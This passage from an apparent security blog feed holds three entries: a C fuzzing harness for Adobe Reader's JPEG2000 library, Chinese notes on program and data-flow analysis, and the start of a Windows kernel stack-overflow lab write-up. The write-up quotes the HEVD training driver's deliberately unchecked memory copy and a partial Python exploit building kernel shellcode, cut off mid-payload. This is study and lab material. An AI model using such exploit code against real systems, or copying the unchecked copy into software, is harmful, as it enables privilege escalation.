class="line">NOP(<span class="number">7</span>)</span><br><span class="line">NOP(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* init_something() &#123;</span><br><span class="line"><span class="keyword">return</span> malloc(<span class="number">0x14</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* malloc_1(<span class="type">int</span> size) &#123;</span><br><span class="line">#ifdef DEBUG</span><br><span class="line"><span class="title function_">printf</span><span class="params">(<span class="string">&quot;malloc 0x%x byte\n&quot;</span>, size)</span>;</span><br><span class="line">#endif</span><br><span class="line"><span class="keyword">return</span> malloc(size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* memset_1(<span class="keyword">void</span>* dst, <span class="type">int</span> value, <span class="type">int</span> size) &#123;</span><br><span class="line">#ifdef DEBUG</span><br><span class="line"><span class="title function_">printf</span><span class="params">(<span class="string">&quot;memset(0x%p,0x%x,0x%x)\n&quot;</span>,dst, value, size)</span>;</span><br><span class="line">#endif</span><br><span class="line"><span class="title function_">memset</span><span class="params">(dst, value, size)</span>;</span><br><span class="line"><span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* memcpy_1(<span class="keyword">void</span>* dst, <span class="keyword">void</span>* src, <span class="type">int</span> size) &#123;</span><br><span class="line">#ifdef DEBUG</span><br><span class="line"><span class="title function_">printf</span><span class="params">(<span class="string">&quot;memcpy(0x%p,0x%p,0x%x)\n&quot;</span>,dst,src,size)</span>;</span><br><span class="line">#endif</span><br><span class="line"><span class="title function_">memcpy</span><span class="params">(dst, src, size)</span>;</span><br><span class="line"><span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">free_1</span><span class="params">(<span class="keyword">void</span>* p)</span> &#123;</span><br><span class="line">#ifdef DEBUG</span><br><span class="line"><span class="title function_">printf</span><span class="params">(<span class="string">&quot;free(0x%p)\n&quot;</span>, p)</span>;</span><br><span class="line">#endif</span><br><span class="line"><span class="title function_">free</span><span class="params">(p)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ret_1</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* return_arg0_func(<span class="keyword">void</span>* arg0) &#123;</span><br><span class="line"><span class="keyword">return</span> arg0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct MemObjEx &#123;</span><br><span class="line"><span class="comment">// void* (__cdecl* init_something_)(void);// need implement</span></span><br><span class="line">pfunc_t funcs_0;</span><br><span class="line">pfunc_t funcs_1;</span><br><span class="line">pfunc_t funcs_2;</span><br><span class="line">pfunc_t funcs_3;</span><br><span class="line"><span class="keyword">void</span>* (__cdecl* malloc_1)(<span class="type">int</span>);</span><br><span class="line"><span class="keyword">void</span> (__cdecl* free_1)(<span class="keyword">void</span>*);</span><br><span class="line"><span class="keyword">void</span>* (__cdecl* memcpy_1)(<span class="keyword">void</span>*,<span class="keyword">void</span>*,<span class="type">int</span>);</span><br><span class="line">pfunc_t funcs_7;</span><br><span class="line"><span class="keyword">void</span>* (__cdecl* memset_1)(<span class="keyword">void</span>*, <span class="type">int</span>, <span class="type">int</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct decOpt</span><br><span class="line">&#123;</span><br><span class="line">DWORD unk_1;</span><br><span class="line">DWORD unk_2;</span><br><span class="line">DWORD unk_3;</span><br><span class="line">DWORD unk_4;</span><br><span class="line">DWORD unk_5;</span><br><span class="line">DWORD unk_6;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct stmProcs &#123;</span><br><span class="line">JP2KCodeStm_return_arg0 return_arg0;</span><br><span class="line">JP2KCodeStm_Die die;</span><br><span class="line">JP2KCodeStm_Read read;</span><br><span class="line">JP2KCodeStm_Write write;</span><br><span class="line">JP2KCodeStm_Seek seek;</span><br><span class="line">JP2KCodeStm_TellPos tellPos;</span><br><span class="line">JP2KCodeStm_IsSeekAble seek_able;</span><br><span class="line">JP2KCodeStm_IsReadAble read_able;</span><br><span class="line">JP2KCodeStm_IsWriteAble write_able;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct file_t &#123;</span><br><span class="line"><span class="type">int</span> pos;</span><br><span class="line"><span class="type">char</span>* buf;</span><br><span class="line">DWORD filesize;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">file_t global_file_obj;</span><br><span class="line"></span><br><span class="line"><span class="comment">// define our function</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_read</span><span class="params">(<span class="keyword">void</span>* dummy_this,<span class="keyword">void</span>* buf,<span class="type">int</span> size)</span> &#123;</span><br><span class="line">#ifdef DEBUG</span><br><span class="line"><span class="title function_">printf</span><span class="params">(<span class="string">&quot;in my_read memcpy(0x%p,0x%p,0x%x)\n&quot;</span>,buf,global_file_obj.buf+global_file_obj.pos,size)</span>;</span><br><span class="line">#endif</span><br><span class="line"><span class="type">int</span> <span class="variable">byteRead</span> <span class="operator">=</span> global_file_obj.pos + size &gt; global_file_obj.filesize ?</span><br><span class="line">global_file_obj.filesize - global_file_obj.pos : size;</span><br><span class="line"></span><br><span class="line">memcpy(buf, global_file_obj.buf + global_file_obj.pos, byteRead);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> byteRead;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_seek</span><span class="params">(<span class="type">int</span> flags, <span class="type">int</span> offset)</span> &#123;</span><br><span class="line"><span class="keyword">switch</span> (flags) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>: </span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">global_file_obj.pos += offset;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">global_file_obj.pos = global_file_obj.filesize;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> global_file_obj.pos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">my_die</span><span class="params">(<span class="keyword">void</span>* t)</span> &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_write</span><span class="params">(<span class="keyword">void</span>* dummy_this,<span class="keyword">void</span>* dst, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">#ifdef DEBUG</span><br><span class="line"><span class="title function_">printf</span><span class="params">(<span class="string">&quot;in my_write : memcpy(0x%p,0x%p,0x%x)\n&quot;</span>, dst, global_file_obj.buf + global_file_obj.pos, size)</span>;</span><br><span class="line">#endif</span><br><span class="line"><span class="title function_">memcpy</span><span class="params">(dst, global_file_obj.buf + global_file_obj.pos, size)</span>;</span><br><span class="line">global_file_obj.pos += size;</span><br><span class="line"><span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_tellPos</span><span class="params">(<span class="keyword">void</span>* dummy)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> global_file_obj.pos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">is_read_able</span><span class="params">(<span class="keyword">void</span>* dummy)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">is_seek_able</span><span class="params">(<span class="keyword">void</span>* dummy)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">is_write_able</span><span class="params">(<span class="keyword">void</span>* dummy)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">init_file_obj</span><span class="params">(file_t* fileobj, const <span class="type">char</span>* filename)</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">FILE* fp = fopen(filename, &quot;rb&quot;);</span></span><br><span class="line"><span class="comment">if (fp == NULL)</span></span><br><span class="line"><span class="comment">exit(0);</span></span><br><span class="line"><span class="comment">fseek(fp,0,SEEK_END);</span></span><br><span class="line"><span class="comment">fileobj-&gt;filesize = ftell(fp);</span></span><br><span class="line"><span class="comment">fseek(fp, 0, SEEK_SET);</span></span><br><span class="line"><span class="comment">fileobj-&gt;buf = new char[fileobj-&gt;filesize+4];</span></span><br><span class="line"><span class="comment">fileobj-&gt;pos = 0;</span></span><br><span class="line"><span class="comment">fread(fileobj-&gt;buf, 1, fileobj-&gt;filesize, fp);</span></span><br><span class="line"><span class="comment">fclose(fp);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">HANDLE</span> <span class="variable">hFILE</span> <span class="operator">=</span> CreateFileA((LPCSTR)filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);</span><br><span class="line"></span><br><span class="line">DWORD bytestoread;</span><br><span class="line"><span class="type">DWORD</span> <span class="variable">filesize</span> <span class="operator">=</span> GetFileSize(hFILE, NULL);</span><br><span class="line">fileobj-&gt;filesize = filesize;</span><br><span class="line">fileobj-&gt;buf = <span class="keyword">new</span> <span class="title class_">char</span>[filesize + <span class="number">4</span>];</span><br><span class="line">fileobj-&gt;pos = <span class="number">0</span>;</span><br><span class="line">ReadFile(hFILE,fileobj-&gt;buf,filesize,&amp;bytestoread,NULL);</span><br><span class="line"><span class="comment">// printf(&quot;hFILE %d, file size : %d, bytestoRead : %d\n&quot;,hFILE, filesize, bytestoread);</span></span><br><span class="line">CloseHandle(hFILE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="type">int</span> <span class="title function_">fuzz_me</span><span class="params">(<span class="type">char</span>* filename)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* mem_obj;</span><br><span class="line">MemObjEx memobj;</span><br><span class="line">decOpt decopt_obj;</span><br><span class="line">stmProcs* stmProc = <span class="keyword">new</span> <span class="title class_">stmProcs</span>;</span><br><span class="line"><span class="type">char</span>* unknown3[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fuzz_me</span><span class="params">(<span class="type">char</span>* filename)</span> &#123;</span><br><span class="line">memset(unknown3, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* opt_obj = JP2KDecOptCreate_func();</span><br><span class="line">JP2KDecOptInitToDefaults_func(opt_obj);</span><br><span class="line"><span class="keyword">void</span>* image_obj = JP2KImageCreate_func();</span><br><span class="line"></span><br><span class="line">#ifdef DEBUG</span><br><span class="line"><span class="title function_">printf</span><span class="params">(<span class="string">&quot;mem_obj = 0x%p\n&quot;</span>, mem_obj)</span>;</span><br><span class="line">printf(<span class="string">&quot;image_obj = 0x%p\n&quot;</span>, image_obj);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">init_file_obj</span><span class="params">(&amp;global_file_obj, filename)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">ret</span> <span class="operator">=</span> JP2KImageInitDecoderEx_func(image_obj, &amp;global_file_obj, stmProc, opt_obj, unknown3);</span><br><span class="line">printf(<span class="string">&quot;JP2KImageInitDecoderEx ret = %d\n&quot;</span>, ret);</span><br><span class="line"></span><br><span class="line"><span class="comment">// void* image_data = JP2KImageDataCreate_func();</span></span><br><span class="line"><span class="comment">// int max_res = JP2KImageGetMaxRes_func(image_obj);</span></span><br><span class="line"><span class="comment">// ret = JP2KImageDecodeTileInterleaved_func(image_obj,0,max_res,8,0xff,0,image_data);</span></span><br><span class="line"><span class="comment">// printf(&quot;JP2KImageDecodeTileInterleaved ret = %d\n&quot;, ret);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// JP2KImageDataDestroy_func(image_data);</span></span><br><span class="line">JP2KImageDestroy_func(image_obj);</span><br><span class="line">JP2KDecOptDestroy_func(opt_obj);</span><br><span class="line"></span><br><span class="line">delete[] global_file_obj.buf;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">printf(<span class="string">&quot;Usage : %s &lt;input file&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">memobj.funcs_0 = nop0;</span><br><span class="line">memobj.funcs_1 = nop1;</span><br><span class="line">memobj.funcs_2 = nop2;</span><br><span class="line">memobj.funcs_3 = nop3;</span><br><span class="line">memobj.malloc_1 = malloc_1;</span><br><span class="line">memobj.free_1 = free_1;</span><br><span class="line">memobj.memcpy_1 = memcpy_1;</span><br><span class="line">memobj.funcs_7 = nop7;</span><br><span class="line">memobj.memset_1 = memset_1;</span><br><span class="line"></span><br><span class="line"><span class="type">HMODULE</span> <span class="variable">hJp2klib</span> <span class="operator">=</span> LoadLibraryA(<span class="string">&quot;C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\JP2Klib.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hJp2klib == NULL) &#123;</span><br><span class="line">printf(<span class="string">&quot;failed to load library, last error %d\n&quot;</span>, GetLastError());</span><br><span class="line">exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LOAD_FUNC(hJp2klib, JP2KLibInitEx);</span><br><span class="line">LOAD_FUNC(hJp2klib, JP2KGetMemObjEx);</span><br><span class="line">LOAD_FUNC(hJp2klib, JP2KDecOptCreate);</span><br><span class="line">LOAD_FUNC(hJp2klib, JP2KDecOptInitToDefaults);</span><br><span class="line">LOAD_FUNC(hJp2klib, JP2KImageCreate);</span><br><span class="line">LOAD_FUNC(hJp2klib, JP2KImageInitDecoderEx);</span><br><span class="line">LOAD_FUNC(hJp2klib, JP2KImageDataCreate);</span><br><span class="line">LOAD_FUNC(hJp2klib, JP2KImageGetMaxRes);</span><br><span class="line">LOAD_FUNC(hJp2klib, JP2KImageDecodeTileInterleaved);</span><br><span class="line">LOAD_FUNC(hJp2klib, JP2KImageDataDestroy);</span><br><span class="line">LOAD_FUNC(hJp2klib, JP2KImageDestroy);</span><br><span class="line">LOAD_FUNC(hJp2klib, JP2KDecOptDestroy);</span><br><span class="line"></span><br><span class="line"><span class="comment">// JP2KCodeStm_IsSeekAble JP2KCodeStm_seekable_func = (JP2KCodeStm_IsSeekAble)GetProcAddress(hJp2klib,&quot;?IsSeekable@JP2KCodeStm@@QAE_NXZ&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// setup our vtable </span></span><br><span class="line">stmProc-&gt;return_arg0 = return_arg0_func;</span><br><span class="line">stmProc-&gt;die = my_die;</span><br><span class="line">stmProc-&gt;read = my_read;</span><br><span class="line">stmProc-&gt;seek = my_seek;</span><br><span class="line">stmProc-&gt;write = my_write;</span><br><span class="line">stmProc-&gt;tellPos = my_tellPos;</span><br><span class="line">stmProc-&gt;seek_able = is_seek_able;</span><br><span class="line">stmProc-&gt;read_able = is_read_able;</span><br><span class="line">stmProc-&gt;write_able = is_write_able;</span><br><span class="line"></span><br><span class="line">#ifdef DEBUG</span><br><span class="line"><span class="title function_">printf</span><span class="params">(<span class="string">&quot;JP2KLibInitEx at 0x%p\n&quot;</span>, JP2KLibInitEx_func)</span>;</span><br><span class="line">printf(<span class="string">&quot;JP2KGetMemObjEx at 0x%p\n&quot;</span>, JP2KGetMemObjEx_func);</span><br><span class="line">printf(<span class="string">&quot;JP2KDecOptCreate at 0x%p\n&quot;</span>, JP2KDecOptCreate_func);</span><br><span class="line">printf(<span class="string">&quot;JP2KDecOptInitToDefaults at 0x%p\n&quot;</span>, JP2KDecOptInitToDefaults_func);</span><br><span class="line">printf(<span class="string">&quot;JP2KImageCreate at 0x%p\n&quot;</span>, JP2KImageCreate_func);</span><br><span class="line">printf(<span class="string">&quot;JP2KImageInitDecoderEx at 0x%p\n&quot;</span>, JP2KImageInitDecoderEx_func);</span><br><span class="line"><span class="comment">// printf(&quot;JP2KCodeStm::IsSeekable at 0x%p\n&quot;, JP2KCodeStm_seekable_func);</span></span><br><span class="line">printf(<span class="string">&quot;JP2KImageDataCreate at 0x%p\n&quot;</span>, JP2KImageDataCreate_func);</span><br><span class="line">printf(<span class="string">&quot;JP2KImageGetMaxRes at 0x%p\n&quot;</span>, JP2KImageGetMaxRes_func);</span><br><span class="line">printf(<span class="string">&quot;JP2KImageDecodeTileInterleaved at 0x%p\n&quot;</span>, JP2KImageDecodeTileInterleaved_func);</span><br><span class="line">printf(<span class="string">&quot;JP2KImageDataDestroy at 0x%p\n&quot;</span>, JP2KImageDataDestroy_func);</span><br><span class="line">printf(<span class="string">&quot;JP2KImageDestroy at 0x%p\n&quot;</span>, JP2KImageDestroy_func);</span><br><span class="line">printf(<span class="string">&quot;JP2KDecOptDestroy at 0x%p\n&quot;</span>, JP2KDecOptDestroy_func);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line"><span class="title function_">JP2KLibInitEx_func</span><span class="params">(&amp;memobj)</span>;</span><br><span class="line">mem_obj = JP2KGetMemObjEx_func();</span><br><span class="line"></span><br><span class="line"><span class="comment">// fuzz func</span></span><br><span class="line">fuzz_me(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Program Analysis Note(NJU)</title>
      <link href="/2022/03/09/Program-Analysis-Note-NJU/"/>
      <url>/2022/03/09/Program-Analysis-Note-NJU/</url>
      
        <content type="html"><![CDATA[<h1 id="主动思考主动思考-主观能动性-不要被动接受"><a href="#主动思考主动思考-主观能动性-不要被动接受" class="headerlink" title="主动思考主动思考 主观能动性 不要被动接受"></a>主动思考主动思考 主观能动性 不要被动接受</h1><h1 id="代码可以慢慢过，最重要的是理解，实现举一反三"><a href="#代码可以慢慢过，最重要的是理解，实现举一反三" class="headerlink" title="代码可以慢慢过，最重要的是理解，实现举一反三"></a>代码可以慢慢过，最重要的是理解，实现举一反三</h1><ul><li><p>名词解释</p><p>  Edges&#x2F;Branches&#x2F;Transitions ：边</p><p>  Instrumentation *****<em><strong>：指我们可以实现可以提供模糊测试器对目标代码的</strong>覆盖率提供反馈数据的能力</em>*，它可以复杂到像完全重构一个没有源代码的已经编译好的二进制程序，也可以简单到只是在每个基本块的入口地址上放置一个断点。</p></li></ul><h1 id="java-x2F-soot-x2F-3AC-x2F-jimple"><a href="#java-x2F-soot-x2F-3AC-x2F-jimple" class="headerlink" title="java&#x2F;soot&#x2F;3AC&#x2F;jimple"></a><strong>java&#x2F;soot&#x2F;3AC&#x2F;jimple</strong></h1><p>invokespecial：可以用于调用constuctor构造函数，superclass method, private methods</p><p>invokevirtual:instance methods call常用的实例方法调用(virtual dispatch派生&#x2F;派发)&#x2F;类似查虚表？</p><p>invokeinterface:cannot optimization,checking interface implementation 接口是否实现</p><p>invokestatic:call static methods</p><p>invokedynamic:用于lambda表达式调用&#x2F;java is static typing&#x2F;dynamic language runs on jvm</p><p>method signature : class name : return type method name(parameter1 type ,paramater2 type,…)</p><p>public static void<clinit>这里是类的构造</clinit></p><img src="/2022/03/09/Program-Analysis-Note-NJU/Untitled.png" class title="Untitled"><h1 id="Static-Single-Assignment-SSA"><a href="#Static-Single-Assignment-SSA" class="headerlink" title="Static Single Assignment(SSA)"></a><strong>Static Single Assignment(SSA)</strong></h1><p>静态单目赋值</p><p>优点：flow-insensitive、Define-and-Use</p><p>flow-sensitive :类似火车车厢，trash1-trash2-… &#x2F;考虑程序执行顺序&#x2F;更加精确</p><p>flow-insensitive :混在一起&#x2F;indirectly incorporated&#x2F;更加快速</p><ul><li>conditional constant propagtion?</li></ul><p>缺点: too many varables and phi-functions..</p><h1 id="Control-Flow-Analysis"><a href="#Control-Flow-Analysis" class="headerlink" title="Control Flow Analysis"></a>Control Flow Analysis</h1><p>将3AC转换成CFG（control flow graph&#x2F;a program）</p><p>BB（Basic Blocks）&#x2F;statements&#x2F;nodes: maximal sequences of consecutive 3AC，只能有一个入口和出口 （从该块）</p><ul><li>find leader :第一条指令、有跳转的地方、跳转指令的下一条指令</li><li>连接块直到下一个leader</li></ul><p>Edges&#x2F;control flow: add every BB ，take care of unconditional jump thing ，add entry and exit</p><h1 id="Data-Flow-Analysis"><a href="#Data-Flow-Analysis" class="headerlink" title="Data Flow Analysis"></a>Data Flow Analysis</h1><p>for safety analysis:</p><p>may analysis&#x2F;may true&#x2F;over-approximation&#x2F;不放过任何动态运行时可能的行为&#x2F;初始化为空 botton&#x2F;从小到大近似&#x2F;要求输出所有有机会满足要求的结果&#x2F;Union&#x2F;只要有一条路径即可</p><p>must analysis&#x2F;must true&#x2F;under-approximation&#x2F;初始化为top all&#x2F;从大到小近似&#x2F;要求输出的结果必须是一定满足要求的但不要求输出所有的结果&#x2F;intersection交集</p><p>data-flow value代表了每个可能的program states的抽象，研究一个为每个statement找到一个解决IN and OUT的约束规则</p><p>*the meet operator ^ is used to summarize the contributions from different paths&#x2F;总结不同路径的贡献</p><p>*the union operator U 指每条path都考虑到&#x2F;不应该放过任何一条path&#x2F;或&#x2F;集合并  </p><p>*n is 交集&#x2F;并&#x2F;0交任何都是0</p><p>Reaching Definitions:</p><p>v的定义从q到p的路径上没有新定义出现&#x2F;may analysis&#x2F;</p><img src="/2022/03/09/Program-Analysis-Note-NJU/Untitled1.png" class title="Untitled"><p>Transter Fuction: 公式 OUT &#x3D; IN</p><p>Control Flow: IN &#x3D; U&#x2F;^ predecessor&#x2F;successor</p><p>Algorithm of Reaching Definitions :</p><p>why this iterative algorithm can finally stop?不动点&#x2F;monotonicity</p><img src="/2022/03/09/Program-Analysis-Note-NJU/Untitled2.png" class title="Untitled"><p>Live Variables Analysis:</p><p>backword</p><p>Available Expressions Analysi s:</p><img src="/2022/03/09/Program-Analysis-Note-NJU/Untitled3.png" class title="Untitled"><p>Partial Order 偏序集：</p><p>Reflexivity自反性</p><p>Antisymmetry反对性</p><p>Transitivity传递性 </p><p>View Iterative Algorithm in Another Way</p><p> X &#x3D; F(X)    X是一个不动点</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>(windows kernel)HEVDlab1-win7_stack_overflow</title>
      <link href="/2022/01/09/windows-kernel-HEVDlab1-win7-stack-overflow/"/>
      <url>/2022/01/09/windows-kernel-HEVDlab1-win7-stack-overflow/</url>
      
        <content type="html"><![CDATA[<p>SO-WIN7  </p><p>用OSR加载驱动</p><p>windbg用lm m H*看下驱动HEVD是否加载起来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SECURE</span></span><br><span class="line"><span class="comment">// Secure Note: This is secure because the developer is passing a size</span></span><br><span class="line"><span class="comment">// equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,</span></span><br><span class="line"><span class="comment">// there will be no overflow</span></span><br><span class="line">RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, <span class="keyword">sizeof</span>(KernelBuffer));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">DbgPrint(<span class="string">&quot;[+] Triggering Stack Overflow\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// Vulnerability Note: This is a vanilla Stack based Overflow vulnerability</span></span><br><span class="line"><span class="comment">// because the developer is passing the user supplied size directly to</span></span><br><span class="line"><span class="comment">// RtlCopyMemory()/memcpy() without validating if the size is greater or</span></span><br><span class="line"><span class="comment">// equal to the size of KernelBuffer</span></span><br><span class="line">RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line">__except (EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">Status = GetExceptionCode();</span><br><span class="line">DbgPrint(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到stackoverflow的触发点函数，往上迭代找出完整调用流程</p><img src="/2022/01/09/windows-kernel-HEVDlab1-win7-stack-overflow/Untitled.png" class title="Untitled"><img src="/2022/01/09/windows-kernel-HEVDlab1-win7-stack-overflow/Untitled1.png" class title="Untitled"><p>use DeviceIoControl</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">BOOL DeviceIoControl(</span><br><span class="line">  [<span class="keyword">in</span>]                HANDLE       hDevice,</span><br><span class="line">  [<span class="keyword">in</span>]                DWORD        dwIoControlCode,</span><br><span class="line">  [<span class="keyword">in</span>, optional]      LPVOID       lpInBuffer,</span><br><span class="line">  [<span class="keyword">in</span>]                DWORD        nInBufferSize,</span><br><span class="line">  [out, optional]     LPVOID       lpOutBuffer,</span><br><span class="line">  [<span class="keyword">in</span>]                DWORD        nOutBufferSize,</span><br><span class="line">  [out, optional]     LPDWORD      lpBytesReturned,</span><br><span class="line">  [<span class="keyword">in</span>, out, optional] LPOVERLAPPED lpOverlapped</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes,sys</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">kernel32 = windll.kernel32</span><br><span class="line">hevDevice = kernel32.CreateFileA(<span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>,<span class="number">0xC0000000</span>,<span class="number">0</span>,<span class="literal">None</span>,<span class="number">0x3</span>,<span class="number">0</span>,<span class="literal">None</span>)</span><br><span class="line"><span class="comment">#这可以通过检查访问掩码格式文档并查找相应的潜在值来解释. </span></span><br><span class="line"><span class="comment">#我们要使最高有效位（最左边）设置为C或十进制12。看winnt.h来确定此常数的含义。</span></span><br><span class="line"><span class="comment">#我们在这里看到GENERIC_READ和GENERIC_WRITE分别是0x80000000和0x40000000。</span></span><br><span class="line"><span class="comment">#0xC0000000就是将这两个值加在一起。这样看起来就很直观！</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> hevDevice <span class="keyword">or</span> hevDevice == -<span class="number">1</span>:</span><br><span class="line"><span class="built_in">print</span><span class="string">&quot;*** Couldn&#x27;t get Device Driver handle.&quot;</span></span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line">shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">shellcode += <span class="built_in">bytearray</span>(</span><br><span class="line">    <span class="string">&quot;\x60&quot;</span>                            <span class="comment"># pushad</span></span><br><span class="line">    <span class="string">&quot;\x31\xc0&quot;</span>                        <span class="comment"># xor eax,eax</span></span><br><span 